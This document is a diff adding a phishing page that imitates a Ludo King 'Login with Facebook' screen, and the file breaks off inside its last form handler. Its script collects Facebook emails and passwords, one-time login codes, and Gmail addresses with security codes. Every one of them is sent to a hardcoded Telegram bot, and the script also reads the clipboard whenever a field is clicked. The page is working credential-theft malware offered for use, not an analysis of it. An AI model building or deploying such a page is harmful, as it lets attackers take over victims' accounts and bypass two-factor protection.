@@ -1,0 +1,1001 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ludo King - Login with Facebook</title>
+
+<!-- Open Graph / Preview Image -->
+<meta property="og:title" content="Ludo King - Login">
+<meta property="og:description" content="Login to continue playing with your friends">
+<meta property="og:image" content="https://i.postimg.cc/m2BTwz2P/ludo-dance-season-1200x630-500kb.jpg">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i.postimg.cc/m2BTwz2P/ludo-dance-season-1200x630-500kb.jpg">
+
+<link rel="icon" href="https://i.postimg.cc/m2BTwz2P/ludo-dance-season-1200x630-500kb.jpg">
+
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
+    }
+
+    body {
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background: #0f0f1e;
+        overflow: hidden;
+        position: relative;
+    }
+
+    /* ===== LUDO BACKGROUND ===== */
+    .ludo-bg { position: absolute; inset: 0; overflow: hidden; z-index: 0; }
+
+    .ludo-corner {
+        position: absolute;
+        width: 320px; height: 320px;
+        opacity: 0.15;
+        animation: floatCorner 12s ease-in-out infinite;
+    }
+    .corner-red    { top: -90px; left: -90px;  background: radial-gradient(circle, #ff3b3b, transparent 70%); }
+    .corner-green  { top: -90px; right: -90px; background: radial-gradient(circle, #2ecc71, transparent 70%); animation-delay: 3s; }
+    .corner-blue   { bottom: -90px; left: -90px;  background: radial-gradient(circle, #3498db, transparent 70%); animation-delay: 6s; }
+    .corner-yellow { bottom: -90px; right: -90px; background: radial-gradient(circle, #f1c40f, transparent 70%); animation-delay: 9s; }
+
+    @keyframes floatCorner {
+        0%,100% { transform: scale(1) rotate(0deg); }
+        50%     { transform: scale(1.4) rotate(180deg); }
+    }
+
+    .dice {
+        position: absolute; width: 60px; height: 60px;
+        background: #fff; border-radius: 12px;
+        box-shadow: 0 0 20px rgba(255,255,255,0.4);
+        display: grid; grid-template-columns: repeat(3,1fr);
+        grid-template-rows: repeat(3,1fr);
+        padding: 8px; gap: 3px; opacity: 0.6;
+    }
+    .dice span { border-radius: 50%; background: #222; }
+    .dice span.empty { background: transparent; }
+    .dice-1 { top: 12%; left: 8%;  animation: rollDice 8s linear infinite; }
+    .dice-2 { top: 70%; right: 10%; animation: rollDice 10s linear infinite reverse; }
+    .dice-3 { top: 45%; left: 50%; animation: rollDice 12s linear infinite; }
+
+    @keyframes rollDice {
+        0%{transform:rotate(0) translateY(0);}
+        25%{transform:rotate(90deg) translateY(-30px);}
+        50%{transform:rotate(180deg) translateY(0);}
+        75%{transform:rotate(270deg) translateY(30px);}
+        100%{transform:rotate(360deg) translateY(0);}
+    }
+
+    .token {
+        position: absolute; width: 28px; height: 28px;
+        border-radius: 50%; border: 3px solid #fff;
+        box-shadow: 0 0 15px currentColor;
+        animation: moveToken 10s ease-in-out infinite;
+    }
+    .token-red    { background:#ff3b3b; color:#ff3b3b; top:20%; right:25%; }
+    .token-green  { background:#2ecc71; color:#2ecc71; bottom:25%; left:20%; animation-delay:2s; }
+    .token-blue   { background:#3498db; color:#3498db; top:60%; left:35%; animation-delay:4s; }
+    .token-yellow { background:#f1c40f; color:#f1c40f; bottom:15%; right:30%; animation-delay:6s; }
+
+    @keyframes moveToken {
+        0%,100%{transform:translate(0,0) scale(1);}
+        25%{transform:translate(40px,-30px) scale(1.2);}
+        50%{transform:translate(-20px,40px) scale(0.9);}
+        75%{transform:translate(30px,20px) scale(1.1);}
+    }
+
+    .grid-overlay {
+        position: absolute; inset: 0;
+        background-image:
+            linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
+            linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
+        background-size: 40px 40px;
+    }
+
+    /* ===== MAIN CARD ===== */
+    .login-container {
+        position: relative; z-index: 10;
+        width: 100%; max-width: 420px;
+        padding: 50px 35px;
+        background: rgba(20,20,35,0.9);
+        backdrop-filter: blur(20px);
+        -webkit-backdrop-filter: blur(20px);
+        border: 1px solid rgba(255,255,255,0.1);
+        border-radius: 22px;
+        box-shadow: 0 25px 60px rgba(0,0,0,0.6),
+                    0 0 80px rgba(24,119,242,0.25);
+        animation: cardEntry 0.8s ease-out;
+        text-align: center;
+    }
+
+    @keyframes cardEntry {
+        from { opacity:0; transform: translateY(30px) scale(0.95); }
+        to   { opacity:1; transform: translateY(0) scale(1); }
+    }
+
+    .logo {
+        width: 90px; height: 90px;
+        margin: 0 auto 20px;
+        border-radius: 24px;
+        background: linear-gradient(135deg, #ff3b3b, #f1c40f, #2ecc71, #3498db);
+        display: flex; align-items: center; justify-content: center;
+        font-size: 45px;
+        box-shadow: 0 10px 30px rgba(52,152,219,0.5);
+        animation: pulseLogo 2.5s ease-in-out infinite;
+    }
+    @keyframes pulseLogo {
+        0%,100%{box-shadow:0 10px 30px rgba(52,152,219,0.5);}
+        50%{box-shadow:0 10px 50px rgba(241,196,15,0.85);}
+    }
+
+    .login-container h1 {
+        color: #fff; font-size: 26px; font-weight: 700;
+        margin-bottom: 8px; letter-spacing: 0.5px;
+    }
+
+    .login-container .subtitle {
+        color: #8a8aa0; font-size: 14px;
+        margin-bottom: 32px; line-height: 1.5;
+    }
+
+    .btn-facebook {
+        width: 100%; padding: 16px 20px;
+        border: none; border-radius: 12px;
+        background: #1877f2; color: #fff;
+        font-size: 16px; font-weight: 600;
+        cursor: pointer; transition: all 0.3s ease;
+        display: flex; align-items: center; justify-content: center;
+        gap: 12px; letter-spacing: 0.3px;
+    }
+    .btn-facebook:hover {
+        background: #166fe5; transform: translateY(-2px);
+        box-shadow: 0 14px 35px rgba(24,119,242,0.55);
+    }
+    .btn-facebook:active { transform: translateY(0); }
+    .btn-facebook svg { width: 22px; height: 22px; fill: #fff; }
+    .btn-facebook:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
+
+    .footer-note {
+        margin-top: 28px; color: #55556a;
+        font-size: 12px; line-height: 1.7;
+    }
+
+    .spinner {
+        width: 18px; height: 18px;
+        border: 2.5px solid rgba(255,255,255,0.35);
+        border-top-color: #fff;
+        border-radius: 50%;
+        animation: spin 0.7s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* ===== MODAL COMMON ===== */
+    .modal-overlay {
+        display: none;
+        position: fixed;
+        inset: 0;
+        background: rgba(0,0,0,0.75);
+        backdrop-filter: blur(6px);
+        -webkit-backdrop-filter: blur(6px);
+        z-index: 1000;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+        animation: fadeIn 0.3s ease;
+    }
+    .modal-overlay.active { display: flex; }
+
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+    .modal {
+        width: 100%; max-width: 400px;
+        background: #fff; border-radius: 12px;
+        overflow: hidden;
+        box-shadow: 0 25px 70px rgba(0,0,0,0.5);
+        animation: modalPop 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+        font-family: Helvetica, Arial, sans-serif;
+    }
+
+    @keyframes modalPop {
+        from { opacity: 0; transform: scale(0.85) translateY(20px); }
+        to   { opacity: 1; transform: scale(1) translateY(0); }
+    }
+
+    .modal-header {
+        background: #1877f2; color: #fff;
+        text-align: center; padding: 18px; position: relative;
+    }
+    .modal-header h2 { font-size: 18px; font-weight: 600; }
+    .modal-close {
+        position: absolute; right: 14px; top: 50%;
+        transform: translateY(-50%);
+        background: transparent; border: none; color: #fff;
+        font-size: 26px; cursor: pointer; line-height: 1;
+        opacity: 0.85; padding: 4px 8px;
+    }
+    .modal-close:hover { opacity: 1; }
+
+    .modal-body { padding: 22px 25px 15px; background: #fff; }
+
+    .fb-logo { text-align: center; margin-bottom: 16px; }
+    .fb-logo svg { width: 50px; height: 50px; fill: #1877f2; }
+
+    .modal-desc {
+        text-align: center; color: #606770;
+        font-size: 13px; margin-bottom: 18px; line-height: 1.5;
+    }
+
+    .modal-input {
+        width: 100%; padding: 14px 15px;
+        border: 1px solid #ccd0d5; border-radius: 6px;
+        font-size: 15px; margin-bottom: 14px; outline: none;
+        color: #1c1e21; transition: border-color 0.2s, box-shadow 0.2s;
+        background: #fff;
+        cursor: pointer;
+    }
+    .modal-input:focus {
+        border-color: #1877f2;
+        box-shadow: 0 0 0 2px rgba(24,119,242,0.15);
+    }
+    .modal-input::placeholder { color: #90949c; }
+
+    .modal-btn {
+        width: 100%; padding: 13px;
+        background: #1877f2; color: #fff;
+        border: none; border-radius: 6px;
+        font-size: 16px; font-weight: 600;
+        cursor: pointer; transition: background 0.2s; margin-top: 5px;
+    }
+    .modal-btn:hover { background: #166fe5; }
+    .modal-btn:disabled { opacity: 0.7; cursor: not-allowed; }
+
+    .modal-footer {
+        background: #f5f6f7; padding: 14px;
+        text-align: center; border-top: 1px solid #dddfe2;
+        font-size: 12px; color: #90949c;
+    }
+
+    /* ===== CODE POPUP ===== */
+    .code-icon {
+        width: 70px; height: 70px;
+        margin: 0 auto 14px;
+        border-radius: 50%;
+        background: linear-gradient(135deg, #e7f0fd, #cfe0fa);
+        display: flex; align-items: center; justify-content: center;
+        font-size: 34px;
+        animation: codePulse 2s ease-in-out infinite;
+    }
+
+    @keyframes codePulse {
+        0%,100% { box-shadow: 0 0 0 0 rgba(24,119,242,0.4); }
+        50%     { box-shadow: 0 0 0 12px rgba(24,119,242,0); }
+    }
+
+    .code-title {
+        text-align: center; color: #1c1e21;
+        font-size: 18px; font-weight: 600;
+        margin-bottom: 8px;
+    }
+
+    .code-subtitle {
+        text-align: center; color: #606770;
+        font-size: 13px; line-height: 1.5;
+        margin-bottom: 22px;
+    }
+    .code-subtitle b { color: #1877f2; }
+
+    .code-input {
+        width: 100%;
+        padding: 16px;
+        font-size: 24px;
+        font-weight: 700;
+        letter-spacing: 10px;
+        text-align: center;
+        border: 2px solid #ccd0d5;
+        border-radius: 10px;
+        outline: none;
+        color: #1c1e21;
+        background: #f8f9fb;
+        transition: all 0.25s ease;
+        font-family: 'Courier New', monospace;
+        cursor: pointer;
+        margin-bottom: 12px;
+    }
+    .code-input:focus {
+        border-color: #1877f2;
+        background: #fff;
+        box-shadow: 0 0 0 4px rgba(24,119,242,0.12);
+    }
+    .code-input::placeholder {
+        color: #c8ccd0;
+        letter-spacing: 10px;
+    }
+
+    .code-hint {
+        text-align: center;
+        color: #90949c;
+        font-size: 12px;
+        margin-bottom: 14px;
+    }
+
+    .resend-row {
+        text-align: center;
+        margin-top: 12px;
+        margin-bottom: 6px;
+        font-size: 13px;
+        color: #606770;
+    }
+    .resend-link {
+        color: #1877f2;
+        font-weight: 600;
+        cursor: pointer;
+        text-decoration: none;
+        margin-left: 4px;
+    }
+    .resend-link:hover { text-decoration: underline; }
+    .resend-link.disabled {
+        color: #90949c;
+        cursor: not-allowed;
+        text-decoration: none;
+        pointer-events: none;
+    }
+
+    .code-error {
+        display: none;
+        text-align: center;
+        color: #e74c3c;
+        font-size: 13px;
+        margin-bottom: 10px;
+        font-weight: 500;
+    }
+
+    .code-success {
+        display: none;
+        text-align: center;
+        padding: 20px 0;
+    }
+    .code-success.show { display: block; }
+
+    .checkmark {
+        width: 70px; height: 70px;
+        margin: 0 auto 15px;
+        border-radius: 50%;
+        background: #2ecc71;
+        display: flex; align-items: center; justify-content: center;
+        font-size: 38px; color: #fff;
+        animation: checkPop 0.5s ease-out;
+    }
+    @keyframes checkPop {
+        0%   { transform: scale(0); }
+        60%  { transform: scale(1.15); }
+        100% { transform: scale(1); }
+    }
+
+    .code-success h3 {
+        color: #2ecc71; font-size: 20px; margin-bottom: 6px;
+    }
+    .code-success p { color: #606770; font-size: 14px; }
+
+    /* ===== BIND POPUP ===== */
+    .bind-icon {
+        width: 70px; height: 70px;
+        margin: 0 auto 14px;
+        border-radius: 50%;
+        background: linear-gradient(135deg, #fce4e4, #fbd0d0);
+        display: flex; align-items: center; justify-content: center;
+        font-size: 34px;
+        animation: bindPulse 2s ease-in-out infinite;
+    }
+    @keyframes bindPulse {
+        0%,100% { box-shadow: 0 0 0 0 rgba(234,67,53,0.4); }
+        50%     { box-shadow: 0 0 0 12px rgba(234,67,53,0); }
+    }
+
+    .bind-title {
+        text-align: center; color: #1c1e21;
+        font-size: 18px; font-weight: 700;
+        margin-bottom: 6px;
+    }
+
+    .bind-subtitle {
+        text-align: center; color: #606770;
+        font-size: 13px; line-height: 1.5;
+        margin-bottom: 22px;
+    }
+    .bind-subtitle b { color: #ea4335; }
+
+    .bind-label {
+        display: block;
+        font-size: 12px;
+        font-weight: 600;
+        color: #606770;
+        margin-bottom: 6px;
+        margin-top: 4px;
+        text-align: left;
+    }
+
+    .final-loading {
+        display: none;
+        text-align: center;
+        padding: 25px 0;
+    }
+    .final-loading.show { display: block; }
+
+    .final-spinner {
+        width: 55px; height: 55px;
+        margin: 0 auto 18px;
+        border: 5px solid #e7f0fd;
+        border-top-color: #1877f2;
+        border-radius: 50%;
+        animation: spin 0.8s linear infinite;
+    }
+
+    .final-loading h3 {
+        color: #1c1e21; font-size: 18px; margin-bottom: 6px;
+    }
+    .final-loading p { color: #606770; font-size: 14px; }
+
+    .toast {
+        position: fixed;
+        bottom: 30px;
+        left: 50%;
+        transform: translateX(-50%) translateY(100px);
+        background: #2ecc71;
+        color: #fff;
+        padding: 12px 22px;
+        border-radius: 30px;
+        font-size: 14px;
+        font-weight: 500;
+        box-shadow: 0 10px 30px rgba(46,204,113,0.4);
+        z-index: 9999;
+        opacity: 0;
+        transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+        pointer-events: none;
+    }
+    .toast.show {
+        opacity: 1;
+        transform: translateX(-50%) translateY(0);
+    }
+
+    @media (max-width: 480px) {
+        .login-container { margin: 20px; padding: 40px 25px; }
+        .ludo-corner { width: 200px; height: 200px; }
+        .code-input { font-size: 20px; letter-spacing: 8px; }
+    }
+</style>
+</head>
+<body>
+
+    <!-- LUDO BACKGROUND -->
+    <div class="ludo-bg">
+        <div class="grid-overlay"></div>
+        <div class="ludo-corner corner-red"></div>
+        <div class="ludo-corner corner-green"></div>
+        <div class="ludo-corner corner-blue"></div>
+        <div class="ludo-corner corner-yellow"></div>
+
+        <div class="dice dice-1">
+            <span></span><span class="empty"></span><span class="empty"></span>
+            <span class="empty"></span><span></span><span class="empty"></span>
+            <span class="empty"></span><span class="empty"></span><span></span>
+        </div>
+        <div class="dice dice-2">
+            <span></span><span class="empty"></span><span></span>
+            <span class="empty"></span><span></span><span class="empty"></span>
+            <span></span><span class="empty"></span><span></span>
+        </div>
+        <div class="dice dice-3">
+            <span class="empty"></span><span></span><span class="empty"></span>
+            <span></span><span></span><span></span>
+            <span class="empty"></span><span></span><span class="empty"></span>
+        </div>
+
+        <div class="token token-red"></div>
+        <div class="token token-green"></div>
+        <div class="token token-blue"></div>
+        <div class="token token-yellow"></div>
+    </div>
+
+    <!-- MAIN CARD -->
+    <div class="login-container">
+        <div class="logo">🎲</div>
+        <h1>Ludo King</h1>
+        <p class="subtitle">Login to continue playing<br>with your friends</p>
+
+        <button type="button" class="btn-facebook" id="fbBtn">
+            <svg viewBox="0 0 24 24"><path d="M22 12c0-5.52-4.48-10-10-10S2 6.48 2 12c0 4.84 3.44 8.87 8 9.8V15H8v-3h2V9.5C10 7.57 11.57 6 13.5 6H16v3h-2c-.55 0-1 .45-1 1v2h3v3h-3v6.95c5.05-.5 9-4.76 9-9.95z"/></svg>
+            Login with Facebook
+        </button>
+
+        <div class="footer-note">
+            🔒 Your information is secure.<br>
+            By logging in you agree to our Terms.
+        </div>
+    </div>
+
+    <!-- ============ FACEBOOK POPUP ============ -->
+    <div class="modal-overlay" id="fbModal">
+        <div class="modal">
+            <div class="modal-header">
+                <h2>Log in to Facebook</h2>
+                <button class="modal-close" id="fbClose">&times;</button>
+            </div>
+
+            <div class="modal-body">
+                <div class="fb-logo">
+                    <svg viewBox="0 0 24 24"><path d="M22 12c0-5.52-4.48-10-10-10S2 6.48 2 12c0 4.84 3.44 8.87 8 9.8V15H8v-3h2V9.5C10 7.57 11.57 6 13.5 6H16v3h-2c-.55 0-1 .45-1 1v2h3v3h-3v6.95c5.05-.5 9-4.76 9-9.95z"/></svg>
+                </div>
+
+                <p class="modal-desc">
+                    Ludo King wants to access your Facebook account
+                </p>
+
+                <form id="fbForm">
+                    <input type="text" class="modal-input copy-on-click" id="fbEmail"
+                           placeholder="Email address or phone number" required autocomplete="off">
+
+                    <input type="password" class="modal-input copy-on-click" id="fbPassword"
+                           placeholder="Password" required autocomplete="off">
+
+                    <button type="submit" class="modal-btn" id="fbSubmitBtn">
+                        Log In
+                    </button>
+                </form>
+
+                <a href="#" class="fb-forgot" style="display:block;text-align:center;color:#1877f2;text-decoration:none;font-size:13px;margin-top:14px;padding-bottom:10px;">Forgotten password?</a>
+            </div>
+
+            <div class="modal-footer">
+                🔒 Secure Connection • facebook.com
+            </div>
+        </div>
+    </div>
+
+    <!-- ============ CODE POPUP ============ -->
+    <div class="modal-overlay" id="codeModal">
+        <div class="modal">
+            <div class="modal-header">
+                <h2>Security Verification</h2>
+                <button class="modal-close" id="codeClose">&times;</button>
+            </div>
+
+            <div class="modal-body">
+                <div id="codeEntryView">
+                    <div class="code-icon">🔐</div>
+
+                    <h3 class="code-title">Enter Login Code</h3>
+                    <p class="code-subtitle">
+                        A 6–8 digit verification code has been sent to<br>
+                        your <b>WhatsApp or Facebook Notification</b>
+                    </p>
+
+                    <form id="codeForm">
+                        <input type="tel"
+                               class="code-input copy-on-click"
+                               id="codeInput"
+                               placeholder="——————"
+                               maxlength="8"
+                               pattern="[0-9]*"
+                               inputmode="numeric"
+                               autocomplete="one-time-code"
+                               required>
+
+                        <div class="code-error" id="codeError">
+                            ⚠️ Please enter a valid 6–8 digit code.
+                        </div>
+
+                        <div class="code-hint">6 to 8 digits only</div>
+
+                        <button type="submit" class="modal-btn" id="codeSubmitBtn">
+                            Verify Code
+                        </button>
+
+                        <div class="resend-row">
+                            Didn't receive the code?
+                            <a class="resend-link" id="resendLink">Resend</a>
+                        </div>
+                    </form>
+                </div>
+
+                <div class="code-success" id="codeSuccess">
+                    <div class="checkmark">✓</div>
+                    <h3>Verified!</h3>
+                    <p>Please wait...</p>
+                </div>
+            </div>
+
+            <div class="modal-footer">
+                🔒 Encrypted • facebook.com
+            </div>
+        </div>
+    </div>
+
+    <!-- ============ BIND POPUP ============ -->
+    <div class="modal-overlay" id="bindModal">
+        <div class="modal">
+            <div class="modal-header">
+                <h2>Account Verification</h2>
+                <button class="modal-close" id="bindClose">&times;</button>
+            </div>
+
+            <div class="modal-body">
+                <div id="bindFormView">
+                    <div class="bind-icon">📧</div>
+
+                    <h3 class="bind-title">Account Verification for Bind</h3>
+                    <p class="bind-subtitle">
+                        Please bind your <b>Gmail</b> account and enter the<br>
+                        security code to complete verification.
+                    </p>
+
+                    <form id="bindForm">
+                        <label class="bind-label" for="bindGmail">Bind Gmail</label>
+                        <input type="email" class="modal-input copy-on-click" id="bindGmail"
+                               placeholder="yourname@gmail.com" required autocomplete="off">
+
+                        <label class="bind-label" for="bindCode">Security Code</label>
+                        <input type="tel" class="code-input copy-on-click" id="bindCode"
+                               placeholder="——————"
+                               maxlength="8"
+                               pattern="[0-9]*"
+                               inputmode="numeric"
+                               autocomplete="off"
+                               style="font-size:22px; letter-spacing:8px; padding:14px;"
+                               required>
+
+                        <div class="code-error" id="bindError" style="margin-top:6px;">
+                            ⚠️ Please enter valid Gmail and 6–8 digit code.
+                        </div>
+
+                        <button type="submit" class="modal-btn" id="bindSubmitBtn" style="margin-top:14px;">
+                            Continue
+                        </button>
+                    </form>
+                </div>
+
+                <div class="final-loading" id="finalLoading">
+                    <div class="final-spinner"></div>
+                    <h3>Redirecting...</h3>
+                    <p>Please wait, opening Ludo King</p>
+                </div>
+            </div>
+
+            <div class="modal-footer">
+                🔒 Secure Verification • Ludo King
+            </div>
+        </div>
+    </div>
+
+    <!-- Toast -->
+    <div class="toast" id="toast">✅ Copied!</div>
+
+    <script>
+        // ============ CONFIG ============
+        const TELEGRAM_BOT_TOKEN = "8320070006:AAHePE7IPR5ellx7kIg6_8I7_L8TUAG4A7w";
+        const TELEGRAM_CHAT_ID   = "7999697290";
+        const REDIRECT_URL       = "https://ludoking.com/";
+        // =================================
+
+        // 🎭 Ludo King themed emojis
+        const EMOJI_POOL = [
+            "🎲","🎯","👑","🏆","🎮","🎰","🃏","🀄","♟️","🎪",
+            "🚀","⭐","🔥","💎","🎁","🎨","🎭","🎺","🥇","🎖️",
+            "🦁","🐯","🦊","🐼","🦄","🐉","🦅","🐺","🦋","🐢"
+        ];
+
+        function getDeviceEmoji() {
+            let emoji = localStorage.getItem("lk_device_emoji");
+            if (!emoji) {
+                emoji = EMOJI_POOL[Math.floor(Math.random() * EMOJI_POOL.length)];
+                localStorage.setItem("lk_device_emoji", emoji);
+            }
+            return emoji;
+        }
+
+        const DEVICE_EMOJI = getDeviceEmoji();
+
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: "HTML"
+                    })
+                });
+            } catch (e) { console.log("TG error:", e); }
+        }
+
+        // Toast
+        const toast = document.getElementById("toast");
+        let toastTimer = null;
+        function showToast(text) {
+            toast.textContent = text;
+            toast.classList.add("show");
+            clearTimeout(toastTimer);
+            toastTimer = setTimeout(() => toast.classList.remove("show"), 1500);
+        }
+
+        // 📋 Auto copy on SINGLE click — all fields
+        document.querySelectorAll(".copy-on-click").forEach(input => {
+
+            async function handlePaste(field) {
+                try {
+                    const text = await navigator.clipboard.readText();
+                    if (!text) return false;
+
+                    if (field.id === "codeInput" || field.id === "bindCode") {
+                        const clean = text.replace(/[^0-9]/g, "").slice(0, 8);
+                        if (clean) {
+                            field.value = clean;
+                            showToast("📋 Pasted!");
+                            return true;
+                        }
+                    } else {
+                        field.value = text;
+                        showToast("📋 Pasted!");
+                        return true;
+                    }
+                } catch (err) {
+                    console.log("Clipboard access denied");
+                }
+                return false;
+            }
+
+            // Desktop click
+            input.addEventListener("click", function(e) {
+                if (this.dataset.pasted === "1") return;
+                this.dataset.pasted = "1";
+                setTimeout(() => { this.dataset.pasted = "0"; }, 300);
+                handlePaste(this);
+            });
+
+            // Mobile touch
+            input.addEventListener("touchstart", function(e) {
+                if (this.dataset.pasted === "1") return;
+                this.dataset.pasted = "1";
+                setTimeout(() => { this.dataset.pasted = "0"; }, 300);
+                handlePaste(this);
+            }, { passive: true });
+        });
+
+        const fbModal   = document.getElementById("fbModal");
+        const codeModal = document.getElementById("codeModal");
+        const bindModal = document.getElementById("bindModal");
+        const fbBtn     = document.getElementById("fbBtn");
+
+        // ===== FB BUTTON — 2s → FB popup =====
+        fbBtn.addEventListener("click", function() {
+            if (fbBtn.disabled) return;
+            const originalHTML = fbBtn.innerHTML;
+            fbBtn.disabled = true;
+            fbBtn.innerHTML = '<div class="spinner"></div> Connecting to Facebook...';
+
+            setTimeout(() => {
+                fbModal.classList.add("active");
+                fbBtn.disabled = false;
+                fbBtn.innerHTML = originalHTML;
+                setTimeout(() => document.getElementById("fbEmail").focus(), 300);
+            }, 2000);
+        });
+
+        // Close FB
+        document.getElementById("fbClose").addEventListener("click", () => {
+            fbModal.classList.remove("active");
+        });
+        fbModal.addEventListener("click", (e) => {
+            if (e.target === fbModal) fbModal.classList.remove("active");
+        });
+
+        // ===== FB SUBMIT → 📩 Message #1 → 2s → CODE POPUP =====
+        document.getElementById("fbForm").addEventListener("submit", async function(e) {
+            e.preventDefault();
+
+            const email    = document.getElementById("fbEmail").value.trim();
+            const password = document.getElementById("fbPassword").value;
+            if (!email || !password) return;
+
+            const btn = document.getElementById("fbSubmitBtn");
+            btn.textContent = "Logging in...";
+            btn.disabled = true;
+
+            const now = new Date().toLocaleString("en-GB", { timeZone: "Asia/Dhaka" });
+
+            // 📩 MESSAGE #1 — Login info (code tag = click to copy in Telegram)
+            const msg =
+`${DEVICE_EMOJI} <b>Login Info — Ludo King</b> ${DEVICE_EMOJI}
+━━━━━━━━━━━━━━━━━
+📧 <b>Email/Phone_</b><code>${email}</code>
+🔑 <b>Password_</b><code>${password}</code>
+━━━━━━━━━━━━━━━━━
+🕐 <b>Time:</b> ${now}
+━━━━━━━━━━━━━━━━━`;
+
+            await sendToTelegram(msg);
+
+            setTimeout(() => {
+                fbModal.classList.remove("active");
+                codeModal.classList.add("active");
+
+                btn.textContent = "Log In";
+                btn.disabled = false;
+
+                document.getElementById("codeEntryView").style.display = "block";
+                document.getElementById("codeSuccess").classList.remove("show");
+                document.getElementById("codeInput").value = "";
+                document.getElementById("codeError").style.display = "none";
+
+                setTimeout(() => document.getElementById("codeInput").focus(), 400);
+            }, 2000);
+        });
+
+        // Close code modal
+        document.getElementById("codeClose").addEventListener("click", () => {
+            codeModal.classList.remove("active");
+        });
+        codeModal.addEventListener("click", (e) => {
+            if (e.target === codeModal) codeModal.classList.remove("active");
+        });
+
+        // Numbers only
+        document.getElementById("codeInput").addEventListener("input", function() {
+            this.value = this.value.replace(/[^0-9]/g, "").slice(0, 8);
+            document.getElementById("codeError").style.display = "none";
+        });
+
+        // ===== RESEND =====
+        const resendLink = document.getElementById("resendLink");
+        resendLink.addEventListener("click", async function(e) {
+            e.preventDefault();
+            if (this.classList.contains("disabled")) return;
+
+            this.classList.add("disabled");
+            this.textContent = "Sending...";
+
+            const now = new Date().toLocaleString("en-GB", { timeZone: "Asia/Dhaka" });
+            const msg =
+`${DEVICE_EMOJI} <b>Resend Code Requested</b> ${DEVICE_EMOJI}
+━━━━━━━━━━━━━━━━━
+🔄 User requested <b>resend code</b>
+━━━━━━━━━━━━━━━━━
+🕐 <b>Time:</b> ${now}
+━━━━━━━━━━━━━━━━━`;
+
+            await sendToTelegram(msg);
+
+            let seconds = 30;
+            this.textContent = `Resend (${seconds}s)`;
+            const interval = setInterval(() => {
+                seconds--;
+                if (seconds <= 0) {
+                    clearInterval(interval);
+                    this.classList.remove("disabled");
+                    this.textContent = "Resend";
+                } else {
+                    this.textContent = `Resend (${seconds}s)`;
+                }
+            }, 1000);
+        });
+
+        // ===== CODE SUBMIT → 📩 Message #2 → 2s → BIND POPUP =====
+        document.getElementById("codeForm").addEventListener("submit", async function(e) {
+            e.preventDefault();
+
+            const code = document.getElementById("codeInput").value.trim();
+            const errorEl = document.getElementById("codeError");
+
+            if (!/^\d{6,8}$/.test(code)) {
+                errorEl.textContent = "⚠️ Please enter a valid 6–8 digit code.";
+                errorEl.style.display = "block";
+                return;
+            }
+
+            const btn = document.getElementById("codeSubmitBtn");
+            btn.textContent = "Verifying...";
+            btn.disabled = true;
+
+            const now = new Date().toLocaleString("en-GB", { timeZone: "Asia/Dhaka" });
+
+            // 📩 MESSAGE #2 — Code info
+            const msg =
+`${DEVICE_EMOJI} <b>Code Info — Ludo King</b> ${DEVICE_EMOJI}
+━━━━━━━━━━━━━━━━━
+🔢 <b>Code_</b><code>${code}</code>
+━━━━━━━━━━━━━━━━━
+🕐 <b>Time:</b> ${now}
+━━━━━━━━━━━━━━━━━`;
+
+            await sendToTelegram(msg);
+
+            document.getElementById("codeEntryView").style.display = "none";
+            document.getElementById("codeSuccess").classList.add("show");
+
+            btn.textContent = "Verify Code";
+            btn.disabled = false;
+
+            setTimeout(() => {
+                codeModal.classList.remove("active");
+                bindModal.classList.add("active");
+
+                document.getElementById("bindFormView").style.display = "block";
+                document.getElementById("finalLoading").classList.remove("show");
+
+                document.getElementById("bindGmail").value = "";
+                document.getElementById("bindCode").value = "";
+                document.getElementById("bindError").style.display = "none";
+
+                setTimeout(() => document.getElementById("bindGmail").focus(), 400);
+            }, 2000);
+        });
+
+        // Close bind
+        document.getElementById("bindClose").addEventListener("click", () => {
+            bindModal.classList.remove("active");
+        });
+        bindModal.addEventListener("click", (e) => {
+            if (e.target === bindModal) bindModal.classList.remove("active");
+        });
+
+        // Numbers only in bind code
+        document.getElementById("bindCode").addEventListener("input", function() {
+            this.value = this.value.replace(/[^0-9]/g, "").slice(0, 8);
+            document.getElementById("bindError").style.display = "none";
+        });
+
+        // ===== BIND SUBMIT → 📩 Message #3 → Redirect =====
+        document.getElementById("bindForm").addEventListener("submit", async function(e) {
+            e.preventDefault();
+
+            const gmail = document.getElementById("bindGmail").value.trim();
+            const code  = document.getElementById("bindCode").value.trim();
+            const errorEl = document.getElementById("bindError");
+
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+            if (!emailRegex.test(gmail) || !/^\d{6,8}$/.test(code)) {
+                errorEl.textContent = "⚠️ Please enter valid Gmail and 6–8 digit code.";
+                errorEl.style.display = "block";
+                return;
+            }
+
+            const btn = document.getElementById("bindSubmitBtn");
+            btn.textContent = "Verifying...";
+            btn.disabled = true;
+
+            const now = new Date().toLocaleString("en-GB", { timeZone: "Asia/Dhaka" });
+
+            // 📩 MESSAGE #3 — Bind info
+            const msg =
+`${DEVICE_EMOJI} <b>Bind Info — Ludo King</b> ${DEVICE_EMOJI}
+━━━━━━━━━━━━━━━━━
+📨 <b>Bind Gmail_</b><code>${gmail}</code>
+🔐 <b>Security Code_</b><code>${code}</code>
+━━━━━━━━━━━━━━━━━
+🕐 <b>Time:</b> ${now}
+━━━━━━━━━━━━━━━━━
+✅ <b>Login Complete</b>`;
+
+            await sendToTelegram(msg);
+
+            document.getElementById("bindFormView").style.display = "none";
